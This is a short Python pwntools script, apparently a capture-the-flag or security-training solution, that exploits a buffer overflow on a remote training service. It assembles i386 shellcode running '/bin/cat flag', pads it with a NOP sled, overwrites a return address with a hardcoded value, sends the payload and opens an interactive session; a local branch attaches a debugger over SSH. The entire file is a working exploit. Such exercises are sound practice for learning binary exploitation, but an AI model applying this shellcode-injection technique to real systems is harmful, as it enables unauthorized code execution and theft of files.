from pwn import *



run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/3/sh3llc0d3')
	pid=gdb.attach(r)
	input("wait")
else:
	r=remote("bin.training.jinblack.it",2002)

context.clear(arch='i386',os='linux')

sc = shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"])

#212
shellcode = b"\x90"*20+asm(sc)
shellcode = shellcode.ljust(212,b'\x90') + b"\x60\xc0\x04\x08" + b"\x90"*784


shellcode = shellcode.ljust(1000,b"A")

r.send(shellcode)


r.interactive()

